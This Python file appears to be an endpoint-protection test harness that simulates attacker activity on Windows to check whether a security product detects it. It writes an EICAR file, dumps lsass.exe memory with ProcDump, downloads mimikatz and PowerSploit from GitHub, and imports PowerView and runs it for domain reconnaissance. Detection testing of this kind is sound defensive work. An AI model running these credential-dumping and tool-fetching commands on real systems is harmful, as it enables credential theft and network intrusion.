import subprocess as sp
from time import sleep
import os
from zipfile import ZipFile
import shutil
from colorama import init as colorama_init
from colorama import Fore
from colorama import Style
import webbrowser
import time


class EPScenario:
    def __init__(self, ps, path):
        self.PS = ps
        self.path = path
        self.powersploit = r"https://github.com/PowerShellMafia/PowerSploit/archive/refs/heads/master.zip"
        self.mimikatz = r"https://github.com/ParrotSec/mimikatz/archive/refs/heads/master.zip"
        self.powerview = r"https://github.com/PowerShellMafia/PowerSploit/raw/refs/heads/master/Recon/PowerView.ps1"
        colorama_init() # Initialize colorset
        
        # Ensure path exists and is writable
        try:
            os.makedirs(self.path, exist_ok=True)
            # Test write permissions
            test_file = os.path.join(self.path, "test.tmp")
            with open(test_file, "w") as f:
                f.write("test")
            os.remove(test_file)
        except Exception as e:
            print(f"{Fore.RED}[-]{Style.RESET_ALL} Cannot write to {self.path}: {e}\n")
            raise

    def make_Eicar(self):
        '''Generate EICAR file on user Desktop'''

        eicar_file = os.path.join(f"{self.path}", "EICAR.txt")

        try:
            with open(eicar_file, "w") as f:
                f.write(r"X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*")
            
            print(f"{Fore.LIGHTGREEN_EX}[+]{Style.RESET_ALL} File created: EICAR.txt!\n")
            print(f"{Fore.LIGHTGREEN_EX}[+]{Style.RESET_ALL} Looking for generated EICAR file.\n")
            
            # Set a timeout for EICAR detection
            max_wait_time = 30  # seconds
            start_time = time.time()
            
            while True:
                # Check if file still exists
                if not os.path.exists(eicar_file):
                    print(f"{Fore.LIGHTGREEN_EX}[+]{Style.RESET_ALL} EICAR file detected and removed by security solution!\n")
                    break
                    
                # Check if we've exceeded the timeout
                if time.time() - start_time > max_wait_time:
                    print(f"{Fore.YELLOW}[!]{Style.RESET_ALL} EICAR detection timeout reached. Proceeding...\n")
                    break
                    
                sleep(1)  # Check every second
                
            # Clean up if file still exists
            if os.path.exists(eicar_file):
                try:
                    os.remove(eicar_file)
                    print(f"{Fore.LIGHTGREEN_EX}[+]{Style.RESET_ALL} Manually removed EICAR file.\n")
                except Exception as e:
                    print(f"{Fore.RED}[-]{Style.RESET_ALL} Failed to remove EICAR file: {e}\n")

        except Exception as e:
            print(f"{Fore.RED}[-]{Style.RESET_ALL} Error creating EICAR file: {e}\n")


    def cs_alerts(self):
        '''Checks Crowdstrike alerts via CS command list.'''

        commands = ["crowdstrike_test_low", "crowdstrike_test_medium", "crowdstrike_test_high", "crowdstrike_test_critical"]

        for cmd in commands:
            try:
                print(f"{Fore.LIGHTGREEN_EX}[+]{Style.RESET_ALL} Running: {cmd}\n ")
                result = sp.run(cmd, shell=True, capture_output=True, text=True)

                if result.stdout:
                    print(result.stdout)
                    sleep(2.5)

            except FileNotFoundError as e:
                print(f"{Fore.RED}[-]{Style.RESET_ALL} Command not found.\n{cmd}\n")


    def _dump_setup(self):
        '''Make relevant directories for easier cleanup'''

        os.makedirs(self.path + "ProcDump", exist_ok=True)
        os.makedirs(self.path + "Dump", exist_ok=True)
        path_ = os.path.join(self.path, "ProcDump")
        return path_

    
    def _cleaned_proc(self):
        '''Checks if files were deleted after calling dump_lsass method. - ProcDump'''

        # Collect matching filenames
        files_to_delete = [os.path.join(self.path, f) for f in os.listdir(self.path) if "dump" in f.lower()]
    
        
        if not files_to_delete:
            print(f"{Fore.RED}[-]{Style.RESET_ALL} No files to delete!\n")
            return False
        
        # Flags for proof of deletion

        sf_file = False 
        sf_dir = False

        # Delete files and directories separately
        while not sf_dir and not sf_file:
            for file in files_to_delete:
                try:
                    if os.path.isdir(file): # Check if object is a directory
                        shutil.rmtree(file, ignore_errors=True)  # Delete directory
                        sleep(1)
                        print(f"{Fore.LIGHTGREEN_EX}[+]{Style.RESET_ALL} Deleted directory: {file}\n")
                        sf_dir = True

                    elif os.path.isfile(file): # Check if objet is file
                        os.remove(file)  # Delete file
                        print(f"{Fore.LIGHTGREEN_EX}[+]{Style.RESET_ALL} Deleted file: {file}\n")
                        sf_file = True

                except PermissionError as e:
                    print(f"{Fore.RED}[!] Permission denied: {file} - {e}{Style.RESET_ALL}\n")
        else:
            return True
        

    def _cleaned_tools(self):
        '''Cleaup method to ensure all tools downloaded were removed succssfully. - mimikatz, Powersploit'''

        files_to_delete = [os.path.join(self.path, f) for f in os.listdir(self.path) if any(sub in f.lower() for sub in ["mimikatz", "powersploit", "powerview","master"])]
        # Put all relevant files into a list for easy iteration

        if not files_to_delete:
            print(f"{Fore.RED}[-]{Style.RESET_ALL} No files to delete!\n")
            return False
        
        # Flags for deletion validation

        sf_file = False 
        sf_dir = False

        # Delete files and directories separately
        while not sf_dir and not sf_file:
            for file in files_to_delete:
                try:
                    if os.path.isdir(file): # Check if object is a directory
                        shutil.rmtree(file, ignore_errors=True)  # Delete directory
                        sleep(1)
                        print(f"{Fore.LIGHTGREEN_EX}[+]{Style.RESET_ALL} Deleted directory: {file}\n")
                        sf_dir = True

                    elif os.path.isfile(file): # Check if object is file
                        os.remove(file)  # Delete file
                        print(f"{Fore.LIGHTGREEN_EX}[+]{Style.RESET_ALL} Deleted file: {file}\n")
                        sf_file = True

                except PermissionError as e:
                    print(f"{Fore.RED}[!] Permission denied: {file} - {e}{Style.RESET_ALL}\n")
        else:
            return True
        

    def _remove_logs(self):
        '''Removes log directory and or files according to input'''

        files_to_delete = [os.path.join(self.path, f) for f in os.listdir(self.path) if "log" in f.lower()]

        while True:
            user_input = input("Delete Logs dir? y/n:\n")

            if user_input.lower() == "y":
                
                # Flags for deletion validation

                sf_file = False 
                sf_dir = False

                # Delete files and directories separately
                while not sf_dir and not sf_file:
                    for file in files_to_delete:
                        try:
                            if os.path.isdir(file): # Check if object is a directory
                                shutil.rmtree(file, ignore_errors=True)  # Delete directory
                                sleep(1)
                                print(f"{Fore.LIGHTGREEN_EX}[+]{Style.RESET_ALL} Deleted Logs directory: {file}\n")
                                sf_dir = True

                            elif os.path.isfile(file): # Check if object is file
                                os.remove(file)  # Delete file
                                print(f"{Fore.LIGHTGREEN_EX}[+]{Style.RESET_ALL} Deleted Log file: {file}\n")
                                sf_file = True

                        except PermissionError as e:
                            print(f"{Fore.RED}[!] Permission denied: {file} - {e}{Style.RESET_ALL}\n")
                else:
                    return True
            else:
                print(f"{Fore.LIGHTGREEN_EX}[+]{Style.RESET_ALL} Not deleting log file..\n")
                break

        if not files_to_delete:
            print(f"{Fore.RED}[-]{Style.RESET_ALL} No files to delete!\n")
            return False


    def dump_lsass(self):
        '''Downloads ProcDump and executes basic dump for lsass.exe'''

        extraction_path = self._dump_setup()

        # Download Procdump
        sp.run([self.PS, "-Command", f"""Invoke-WebRequest https://download.sysinternals.com/files/Procdump.zip -OutFile {self.path}Procdump.zip"""] ,shell=True, text=True)
        zip_path = os.path.join(self.path, "Procdump.zip")

        # Unzip file
        with ZipFile(zip_path, "r") as procObject:
            procObject.extractall(path=extraction_path)

        # Run command
        try:
            args = [
                f"{extraction_path}\\procdump64.exe", 
                "-accepteula", 
                "-ma", 
                "lsass.exe", 
                f"{self.path}\\Dump\\lsass.dmp"]
            sp.run(args, shell=True, text=True)

        # Handle error
        except PermissionError as e: # Ignore error output
            sleep(1)
            print(f"{Fore.LIGHTGREEN_EX}[+]{Style.RESET_ALL} Initialized ProcDump in Dump directory!\n")
            sleep(1)
            print(f"{Fore.LIGHTGREEN_EX}[+]{Style.RESET_ALL} Lsass.dmp created at: {self.path}\\Dump\n\n{Fore.LIGHTGREEN_EX}[+]{Style.RESET_ALL} Starting cleanup.....\n")
            sleep(1)

        cleaned_success = self._cleaned_proc()

        if cleaned_success:
                sleep(1)
                print(f"{Fore.LIGHTGREEN_EX}[+]{Style.RESET_ALL} ProcDump scenario cleanup done!\n")
        else:
            print(f"{Fore.RED}[-]{Style.RESET_ALL} Cleaning files failed!\n")


    def _tools_setup(self):
        '''Set up for tool downloads'''

        paths_ = list()
        os.makedirs(self.path + "mimikatz", exist_ok=True)
        os.makedirs(self.path + "Powersploit", exist_ok=True)
        paths_.append(os.path.join(f"{self.path}", "mimikatz"))
        paths_.append(os.path.join(f"{self.path}", "Powersploit"))
        return paths_


    def _powersploit_exceptionH(self, err):
        '''Handles exception if PowerSploit is removed before Security Solution detection'''

        os.makedirs(self.path + "Logs", exist_ok=True)
        log_dir = os.path.join(self.path, "Logs")
        powersploitLogF = os.path.join(log_dir, "PowerSploit.log")    

        with open(powersploitLogF, "w") as f:
                f.write(str(err))
                f.write("\nMost likely caught by the security solution!\n")

        print(f"{Fore.LIGHTBLUE_EX}[*]{Style.RESET_ALL} See log file generated at {powersploitLogF}\n")


    def download_tools(self):
        '''Downloads mimikatz & Powersploit'''
        
        mimikatz_zip = "Mimikatz.zip"
        powersploit_zip = "Powersploit.zip"

        paths = self._tools_setup()

        try:
            # Use more robust PowerShell commands with proper error handling
            download_cmd = f"""
            $ErrorActionPreference = 'Stop'
            try {{
                # Check if we have write permissions
                if (-not (Test-Path -Path '{self.path}' -PathType Container)) {{
                    New-Item -Path '{self.path}' -ItemType Directory -Force
                }}
                
                # Download with retry logic
                $retryCount = 3
                $retryDelay = 2
                
                function Download-File {{
                    param($url, $output)
                    $attempt = 1
                    while ($attempt -le $retryCount) {{
                        try {{
                            Invoke-WebRequest -Uri $url -OutFile $output -UseBasicParsing
                            return $true
                        }} catch {{
                            if ($attempt -eq $retryCount) {{ throw $_ }}
                            Start-Sleep -Seconds $retryDelay
                            $attempt++
                        }}
                    }}
                }}
                
                Download-File -url '{self.mimikatz}' -output '{self.path}{mimikatz_zip}'
                Download-File -url '{self.powersploit}' -output '{self.path}{powersploit_zip}'
            }} catch {{
                Write-Error $_.Exception.Message
                exit 1
            }}
            """
            sp.run([self.PS, "-Command", download_cmd], shell=True, text=True, check=True)

        except sp.CalledProcessError as e:
            print(f"{Fore.RED}[-]{Style.RESET_ALL} Failed to download tools: {e}\n")
            print(f"{Fore.RED}[-]{Style.RESET_ALL} Command output: {e.output}\n")
            print(f"{Fore.RED}[-]{Style.RESET_ALL} Command stderr: {e.stderr}\n")
            return
        except PermissionError as e:
            print(f"{Fore.RED}[-]{Style.RESET_ALL} Access denied. Please ensure you have write permissions to: {self.path}\n")
            print(f"{Fore.RED}[-]{Style.RESET_ALL} Try running the program as Administrator.\n")
            return
        except Exception as e:
            print(f"{Fore.RED}[-]{Style.RESET_ALL} Unexpected error: {e}\n")
            print(f"{Fore.RED}[-]{Style.RESET_ALL} Error type: {type(e).__name__}\n")
            import traceback
            print(f"{Fore.RED}[-]{Style.RESET_ALL} Full traceback:\n{traceback.format_exc()}\n")
            return

        print(f"{Fore.LIGHTGREEN_EX}[+]{Style.RESET_ALL} Downloading tools....\n")
        sleep(3)
        print(f"{Fore.LIGHTGREEN_EX}[+]{Style.RESET_ALL} Tools downloaded successfully!\n")

        
        mimikatz_zip_path = os.path.join(self.path, f"{mimikatz_zip}")
        powersploit_zip_path = os.path.join(self.path, f"{powersploit_zip}")

        # Unzip file
        try:
            with ZipFile(mimikatz_zip_path, "r") as mimiObject:
                mimiObject.extractall(path=paths[0])
        except OSError as e:
            print(f"{Fore.LIGHTGREEN_EX}[+]{Style.RESET_ALL} Mimikatz was blocked by the security solution.\n")
    
        try:
            with ZipFile(powersploit_zip_path, "r") as powerSObject:
                powerSObject.extractall(path=paths[1])
                # Might need to run powerspoit in order for EDR to catch it

        except OSError as e:
            print(f"{Fore.LIGHTBLUE_EX}[*]{Style.RESET_ALL} Powersploit was most likely blocked by the security solution.\n")
            self._powersploit_exceptionH(e)
            sleep(1)
            self._remove_logs()

        if self._cleaned_tools():
            print(f"{Fore.LIGHTGREEN_EX}[+]{Style.RESET_ALL} Files were deleted successfully!\n")
            

    def run_pv(self):
        '''Runs PowerView.ps1'''
        try:
            pv_path = os.path.join(self.path, "PowerView.ps1")
            print(f"{Fore.LIGHTGREEN_EX}[+]{Style.RESET_ALL} Downloading PowerView.ps1 to {pv_path}...\n")
            
            download_cmd = f"""
            $ErrorActionPreference = 'Stop'
            try {{
                Invoke-WebRequest -Uri '{self.powerview}' -OutFile '{pv_path}' -UseBasicParsing
            }} catch {{
                Write-Error $_.Exception.Message
                exit 1
            }}
            """
            
            result = sp.run([self.PS, "-Command", download_cmd], shell=True, capture_output=True, text=True)
            
            if result.returncode != 0:
                print(f"{Fore.RED}[-]{Style.RESET_ALL} Failed to download PowerView.ps1: {result.stderr}\n")
                return
                
            print(f"{Fore.LIGHTGREEN_EX}[+]{Style.RESET_ALL} Running PowerView.ps1\n")
            
            run_cmd = f"""
            $ErrorActionPreference = 'Stop'
            try {{
                Import-Module '{pv_path}'
                Get-NetDomain
            }} catch {{
                Write-Error $_.Exception.Message
                exit 1
            }}
            """
            
            result = sp.run([self.PS, "-Command", run_cmd], shell=True, capture_output=True, text=True)
            
            if result.returncode != 0:
                print(f"{Fore.RED}[-]{Style.RESET_ALL} Failed to run PowerView.ps1: {result.stderr}\n")
            else:
                print(f"{Fore.LIGHTGREEN_EX}[+]{Style.RESET_ALL} PowerView.ps1 executed successfully\n")
                
        except Exception as e:
            print(f"{Fore.RED}[-]{Style.RESET_ALL} Error in run_pv: {e}\n")


    def web_filters(self):
        '''Open various restricted websites to check security solutions'''

        print(f"{Fore.LIGHTGREEN_EX}[+]{Style.RESET_ALL} Opening URL blacklist:\n")

        chrome_path = r"C:/Program Files/Google/Chrome/Application/chrome.exe"
        webbrowser.register('chrome', None,  
                    webbrowser.BackgroundBrowser(chrome_path))
        # For now the URLs will be hardcoded
        urls = ["https://google.com","https://youtube.com","https://x.com","https://hackthebox.com","https://facebook.com"]
        
        for url in urls:
            webbrowser.get('chrome').open_new_tab(url)